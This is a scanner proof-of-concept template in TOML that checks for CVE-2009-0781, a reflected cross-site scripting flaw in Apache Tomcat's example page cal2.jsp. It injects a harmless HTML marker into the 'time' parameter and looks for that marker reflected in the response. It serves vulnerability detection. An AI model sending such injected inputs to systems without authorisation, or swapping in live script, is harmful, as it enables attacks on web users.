[info]
author = "ave"
description = "Apache Tomcat 示例应用日历组件 cal2.jsp 的 time 参数存在反射型跨站脚本漏洞，攻击者可通过构造包含 HTML 标签的 time 参数，若服务器未过滤直接输出到页面响应体中，则判定漏洞存在"
id = "POC-AVE-2009-0024"
name = "CVE-2009-0781 Apache Tomcat cal2.jsp XSS PoC"
severity = "medium"
tags = ["ave-2009-0024"]
vuln_id = [
    "CVE-2009-0781",
    "AVE-2009-0024",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/examples/jsp/cal/cal2.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<h1>AVE-XSS-DETECT</h1>"]

[poc.requests.query]
time = "<h1>AVE-XSS-DETECT</h1>"
